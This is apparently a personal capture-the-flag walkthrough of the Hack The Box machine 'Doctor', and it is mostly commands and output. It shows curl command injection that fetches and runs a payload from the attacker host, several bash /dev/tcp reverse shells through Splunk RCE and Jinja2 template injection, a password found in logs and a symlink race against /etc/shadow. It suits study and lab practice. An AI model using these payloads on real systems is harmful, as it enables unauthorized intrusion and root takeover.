@@ -1,0 +1,468 @@
+Doctor - Hack The Box - Linux Easy - Splunk, Curl Injection,
+
+Ports: 22, 80, 8089 open
+
+8089 - splunkd service
+https://10.10.10.209:8089/
+
+On port 80 we see a bunch of dead links.
+
+We modify the hostname to redirect doctors.htb from 10.10.10.209 by rewriting hosts
+http://doctors.htb/login?next=%2F
+
+We get a login page. We give it the following creds to seek a sql injection vulneraility.
+Commands and Output:
+===================================================================================================================================
+admin@localhost.com
+a' OR 1=1-- -
+===================================================================================================================================
+
+Nothing to interesting, the bytes sent back were 4677, and the bytes that came back with no sql injection were the same.
+We will save the login request from burp into a file to use sqlmap against.
+
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/doctor]
+└──╼ $sqlmap -r login.req --batch
+===================================================================================================================================
+
+Based on the sql output nothing looks injectable based on the parameters found.
+We can try forgot password, using info and admin @doctors.htb but no luck.
+
+We try running sql map against the password reset by saving it to a file via burp and running sqlmap. However there is a csrf toke
+which will make it hard to bypass for sqlmap to work with. Instad we try and regiser first.
+
+We login but have a time limit:
+Your account has been created, with a time limit of twenty minutes!
+
+Creds: hacker@hacker.com : hacker
+
+We change our username to:
+<b>hacker</b>
+
+To see if there is any cross site scripting.
+If our name became bold, it would mean there css.
+
+One of the things we do while poking in the box is make a post pointing to our own server and see if it does anything we put a link
+in the content field of the post.
+Commands and Output:
+===================================================================================================================================
+New Post
+Title
+Content
+http://10.10.14.10/
+
+┌─[user@parrot-virtual]─[~/htb/doctor]
+└──╼ $sudo nc -lnvp 80
+[sudo] password for user: 
+listening on [any] 80 ...
+connect to [10.10.14.10] from (UNKNOWN) [10.10.10.209] 53086
+GET / HTTP/1.1
+Host: 10.10.14.10
+User-Agent: curl/7.68.0
+Accept: */*
+
+===================================================================================================================================
+
+We get a hit, meaning we can try different methods of trying to get code execution via the curl command.
+We can try different ways by adding quotes and see how the server replies when making requests.
+First we make a python server to continually receive requests on hour side and not have to rely on netcat.
+
+Commands and Output:
+===================================================================================================================================
+POST on http://doctors.htb/post/new:
+http://10.10.14.10/$(whoami)
+
+┌─[user@parrot-virtual]─[~/htb/doctor]
+└──╼ $sudo python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.10.209 - - [29/Apr/2021 13:16:10] code 404, message File not found
+10.10.10.209 - - [29/Apr/2021 13:16:10] "GET /web HTTP/1.1" 404 -
+===================================================================================================================================
+
+Interestingly, the response is "/web" meaning that the server was most likely executing the ode from whoami. We can use burp to 
+further send requests via this parameter.
+
+We can get more info by modifying the command, example "id"
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/doctor]
+└──╼ $sudo python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.10.209 - - [29/Apr/2021 13:16:10] code 404, message File not found
+10.10.10.209 - - [29/Apr/2021 13:16:10] "GET /web HTTP/1.1" 404 -
+10.10.10.209 - - [29/Apr/2021 13:19:37] code 404, message File not found
+10.10.10.209 - - [29/Apr/2021 13:19:37] "GET /web HTTP/1.1" 404 -
+10.10.10.209 - - [29/Apr/2021 13:20:15] code 404, message File not found
+10.10.10.209 - - [29/Apr/2021 13:20:15] "GET /uid=1001(web) HTTP/1.1" 404 -
+===================================================================================================================================
+
+We can now try to get command execution working this way. After trying several times trying different encodings such as using
+$IFS and {echo,test}
+EXAMPLE:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/doctor]
+└──╼ $$(echo$IFS'testing')
+bash: testing: command not found
+===================================================================================================================================
+
+Seeing if we can get code execution that way, what we can do is try to upload a payload by writing unto disc and then executing the
+reverse shell payload with bash using the curl method displayed above.
+Commands and Output:
+===================================================================================================================================
+POST /post/new HTTP/1.1
+
+Host: doctors.htb
+
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate
+
+Content-Type: application/x-www-form-urlencoded
+
+Content-Length: 124
+
+Origin: http://doctors.htb
+
+DNT: 1
+
+Connection: close
+
+Referer: http://doctors.htb/post/new
+
+Cookie: session=.eJwlzktqAzEQBNC7aO2F1JK6W77M0F8SDAnM2Cvju0eQTUFVbd67HHnG9VXuz_MVt3J8e7mXLo4DG1jyoFgEncaIhundfDVXx6i-JhhzEweDNpopo5iB4Eyv1hRHOGWFnvsg0ciYEoaYoDXnYkbiCAom1jGrDxiSikZlQ15XnP8a2NWuM4_n7yN-9hBSnb2rL1mCSxtNFaONEEvcgZGqiuXzB5DNQck.YIsaCQ.uUeV2xU73AQJooZdJBZxXYcUeI8
+
+Upgrade-Insecure-Requests: 1
+
+Sec-GPC: 1
+
+
+
+title=Click+me&content=http://10.10.14.10/$(curl$IFS'http://10.10.14.10/tryme'$IFS'-o'$IFS'/var/www/html/tryme')&submit=Post
+===================================================================================================================================
+
+We test this by going to 10.10.10.209/tryme and the file is there, so we can now execute with bach by putting our reverse shell
+payload there.
+
+Commands and Output:
+===================================================================================================================================
+title=Click+me&content=http://10.10.14.10/$(bash$IFS'/var/www/html/tryme')&submit=Post
+===================================================================================================================================
+
+And we get a shell.
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/doctor]
+└──╼ $nc -lnvp 9001
+listening on [any] 9001 ...
+connect to [10.10.14.10] from (UNKNOWN) [10.10.10.209] 45738
+bash: cannot set terminal process group (823): Inappropriate ioctl for device
+bash: no job control in this shell
+web@doctor:~$ whoami
+whoami
+web
+web@doctor:~$ 
+===================================================================================================================================
+
+We can now start searching form more interesting materials.
+Commands and Output:
+===================================================================================================================================
+web@doctor:~/blog$ ls
+flaskblog  run.py
+web@doctor:~/blog$ cd flaskblog/
+web@doctor:~/blog/flaskblog$ ls
+config.py  errors  __init__.py  main  models.py  posts  __pycache__  site.db  static  templates  tmp  users
+web@doctor:~/blog/flaskblog$ 
+===================================================================================================================================
+
+We see a databse file which can dump locally on our machine using sqlite3
+and we get some credentials
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/doctor]
+└──╼ $cat dump 
+PRAGMA foreign_keys=OFF;
+BEGIN TRANSACTION;
+CREATE TABLE user (
+	id INTEGER NOT NULL, 
+	username VARCHAR(20) NOT NULL, 
+	email VARCHAR(120) NOT NULL, 
+	image_file VARCHAR(20) NOT NULL, 
+	password VARCHAR(60) NOT NULL, 
+	PRIMARY KEY (id), 
+	UNIQUE (username), 
+	UNIQUE (email)
+);
+INSERT INTO user VALUES(1,'admin','admin@doctor.htb','default.gif','$2b$12$Tg2b8u/elwAyfQOvqvxJgOTcsbnkFANIDdv6jVXmxiWsg4IznjI0S');
+CREATE TABLE post (
+	id INTEGER NOT NULL, 
+	title VARCHAR(100) NOT NULL, 
+	date_posted DATETIME NOT NULL, 
+	content TEXT NOT NULL, 
+	user_id INTEGER NOT NULL, 
+	PRIMARY KEY (id), 
+	FOREIGN KEY(user_id) REFERENCES user (id)
+);
+INSERT INTO post VALUES(1,'Doctor blog','2020-09-18 20:48:37.55555','A free blog to share medical knowledge. Be kind!',1);
+COMMIT;
+===================================================================================================================================
+
+Found a bcrypt hash for user admin, we can try and crack it.
+Commands and Output:
+===================================================================================================================================
+~/hashcat$ hashcat -m 3200 doctor rockyou.txt
+===================================================================================================================================
+
+Next item to use is running linpeas on the victim machine.
+We also find a shawn user, which we can recursively try and find files owned by that user.
+Commands and Output:
+===================================================================================================================================
+find / -user shaun -ls 2>/dev/null 
+===================================================================================================================================
+
+One thing to notice is that we are part of the adm group and we have the ability to read logs, in /var/log
+Commands and Output:
+===================================================================================================================================
+web@doctor:/dev/shm$ groups
+web adm
+===================================================================================================================================
+
+We find an interesting var log inside apache2 named backup
+Commands and Output:
+===================================================================================================================================
+apache2:
+total 24372
+drwxr-x---  2 root adm        4096 Apr 29 21:33 .
+drwxrwxr-x 13 root syslog     4096 Apr 29 21:33 ..
+-rw-r-----  1 root adm    21948344 Apr 29 23:01 access.log
+-rw-r-----  1 root adm        6626 Sep 28  2020 access.log.1
+-rw-r-----  1 root adm         323 Aug 21  2020 access.log.10.gz
+-rw-r-----  1 root adm         270 Aug 18  2020 access.log.11.gz
+-rw-r--r--  1 root root    2194472 Jul 27  2020 access.log.12.gz
+-rw-r-----  1 root adm        1493 Sep 23  2020 access.log.2.gz
+-rw-r-----  1 root adm        3951 Sep 22  2020 access.log.3.gz
+-rw-r-----  1 root adm        1341 Sep 19  2020 access.log.4.gz
+-rw-r-----  1 root adm      664054 Sep 15  2020 access.log.5.gz
+-rw-r-----  1 root adm         384 Sep 14  2020 access.log.6.gz
+-rw-r-----  1 root adm        3018 Sep  7  2020 access.log.7.gz
+-rw-r-----  1 root adm        1338 Sep  6  2020 access.log.8.gz
+-rw-r-----  1 root adm        1266 Sep  5  2020 access.log.9.gz
+-rw-r-----  1 root adm       21578 Sep 17  2020 backup
+-rw-r-----  1 root adm        1546 Apr 29 23:01 error.log
+-rw-r-----  1 root adm        3551 Sep 28  2020 error.log.1
+===================================================================================================================================
+
+We can extract and see the type of requests that were made and see what type of information was pulled.
+Commands and Output:
+===================================================================================================================================
+web@doctor:/var/log/apache2$ cat backup | awk '{print $7}' | sort | uniq -c
+     45 /
+      1 12.1.2\n"
+      6 400
+      1 /evox/about
+      5 /favicon.ico
+      2 /.git/HEAD
+      2 /HNAP1
+     23 /home
+      2 /icons/ubuntu-logo.png
+      3 /login
+      1 /nmaplowercheck1599231606
+      1 /nmaplowercheck1599231646
+      2 /post/new
+      3 /register
+      1 /reset_password?email=Guitar123"
+      2 /robots.txt
+      1 /sdk
+     17 /static/main.css
+     17 /static/profile_pics/default.gi
+===================================================================================================================================
+
+It appears as though a user mistyped their password in the email field and this got logged. We can try testing this and see if 
+matches with the shaun user.
+Commands and Output:
+===================================================================================================================================
+web@doctor:/var/log/apache2$ su - shaun
+Password: 
+shaun@doctor:~$ whoami
+shaun
+===================================================================================================================================
+
+And we are in. you should never see in login forms a password inside of a get request, they should always be POST.
+Commands and Output:
+===================================================================================================================================
+find / -user shaun -ls  2>/dev/null | grep -v "proc\|run\|sys"
+===================================================================================================================================
+
+We don't find much so we will again look at port 8089. We click on services and can login using shaun's creds.
+shaun:Guitar123
+
+We also find the splunk version once logged in.
+Commands and Output:
+===================================================================================================================================
+Updated: 2021-04-29T23:39:34+02:00 Splunk build: 8.0.5
+===================================================================================================================================
+
+We can use searchsploit to find exploits but none are found so instead we google:
+splunk rce
+Tools -> within last year
+AND we find github repo called "SplunkWhisperer2"
+which takes advantage of Splunk misconfigurations to get a local priv esc.
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/doctor]
+└──╼ $git clone https://github.com/cnotin/SplunkWhisperer2.git
+Cloning into 'SplunkWhisperer2'...
+remote: Enumerating objects: 55, done.
+remote: Counting objects: 100% (7/7), done.
+remote: Compressing objects: 100% (6/6), done.
+remote: Total 55 (delta 1), reused 2 (delta 1), pack-reused 48
+Receiving objects: 100% (55/55), 20.70 KiB | 385.00 KiB/s, done.
+Resolving deltas: 100% (17/17), done.
+===================================================================================================================================
+
+Commands and Output:
+===================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/doctor/SplunkWhisperer2/PySplunkWhisperer2]
+└──╼ $python PySplunkWhisperer2_remote.py --host 10.10.10.209 --port 8089 --lhost 10.10.14.10 --lport 9001 --username shaun --password Guitar123 --payload "bash -c 'bash -i >& /dev/tcp/10.10.14.10/9002 0>&1'"
+Running in remote mode (Remote Code Execution)
+[.] Authenticating...
+[+] Authenticated
+[.] Creating malicious app bundle...
+[+] Created malicious app bundle in: /tmp/tmp18xx39lj.tar
+[+] Started HTTP server for remote mode
+[.] Installing app from: http://10.10.14.10:9001/
+10.10.10.209 - - [29/Apr/2021 14:47:59] "GET / HTTP/1.1" 200 -
+[+] App installed, your code should be running now!
+
+Press RETURN to cleanup
+===================================================================================================================================
+
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/doctor/SplunkWhisperer2/PySplunkWhisperer2]
+└──╼ $nc -lnvp 9002
+listening on [any] 9002 ...
+connect to [10.10.14.10] from (UNKNOWN) [10.10.10.209] 41312
+bash: cannot set terminal process group (1164): Inappropriate ioctl for device
+bash: no job control in this shell
+root@doctor:/# whoami
+whoami
+root
+root@doctor:/# 
+===================================================================================================================================
+
+
+Now we can try and the intended user way of doing the box.
+The intended way is server side template injection.
+
+Before It was not cross site scripting,it was ssti.
+
+We make a post and if we look at the page source there is a comment with an archives page
+
+Commands and Output:
+===================================================================================================================================
+           <div class="navbar-nav mr-auto">
+              <a class="nav-item nav-link" href="/home">Home</a>
+              <!--archive still under beta testing<a class="nav-item nav-link" href="/archive">Archive</a>-->
+            </div>
+            <!-- Navbar Right Side -->
+            <div class="navbar-nav">
+===================================================================================================================================
+
+We navigate /archive and we get a blank page.
+view-source:http://doctors.htb/archive
+Commands and Output:
+===================================================================================================================================
+
+	<?xml version="1.0" encoding="UTF-8" ?>
+	<rss version="2.0">
+	<channel>
+ 	<title>Archive</title>
+ 	<item><title><b>test</b></title></item>
+
+			</channel>
+===================================================================================================================================
+
+However we can now look at the source code and see that our submitted content is inscribed there.
+If we create a new post with a templating attack.
+Commands and Output:
+===================================================================================================================================
+Content Title:
+{{1+1}}
+Contents:
+testing
+
+We look at source:
+<?xml version="1.0" encoding="UTF-8" ?>
+	<rss version="2.0">
+	<channel>
+ 	<title>Archive</title>
+ 	<item><title>2</title></item>
+
+			</channel>
+
+===================================================================================================================================
+
+It appears to execute the "1+1" statement. Some type of template injection.
+
+Google: hack tricks ssti
+https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
+
+Identify what language it is. Based on testing we find it is most likley jinja2
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2
+
+If we applied the following entry in the title, we could gain our shell, by going to archive after submitting the content
+Commands and Output:
+===================================================================================================================================
+hacker
+{{config.__class__.__init__.__globals__['os'].popen("bash -c 'bash -i &> /dev/tcp/10.10.14.10/9001 0>&1'").read()}}
+test
+
+..
+..
+view-source:http://doctors.htb/archive
+..
+..
+┌─[user@parrot-virtual]─[~/htb/doctor]
+└──╼ $nc -lnvp 9001
+listening on [any] 9001 ...
+connect to [10.10.14.10] from (UNKNOWN) [10.10.10.209] 36390
+bash: cannot set terminal process group (883): Inappropriate ioctl for device
+bash: no job control in this shell
+web@doctor:~$ whoami
+whoami
+web
+web@doctor:~$ 
+===================================================================================================================================
+
+We can further analyze as root how the vulnerabilities work.
+
+The following allows us to gain root by taking advantage of a race condition caused by having the program overwite the sql-lite file
+The cleandb.py program removes the site.db file located in web's directory and then copies an exisiting copy all while changing the
+permissions of the file to that of the web user. 
+
+We can take advantage of this by continously creating a symbolic link to /etc/shadow to give us the ability to write to the file with
+the "chown" command, and enter a new password hash.
+
+The copy command will simply overwrite the contents of the shadow while the link still survives the copy. The "/etc/shadow" should
+now have the pemissions set to the web user.
+
+May have ton try a couple of times before it works.
+Commands and Output:
+===================================================================================================================================
+web@doctor:~/blog/flaskblog$ cat /opt/clean/cleandb.py 
+#!/usr/bin/env python3
+import os
+
+os.system('rm /home/web/blog/flaskblog/site.db')
+os.system('cp /opt/clean/site.db /home/web/blog/flaskblog/site.db')
+os.system('chown web:web /home/web/blog/flaskblog/site.db')
+..
+..
+..
+for ((;;)); do ln -s /etc/shadow /home/web/blog/flaskblog/site.db; done
+===================================================================================================================================
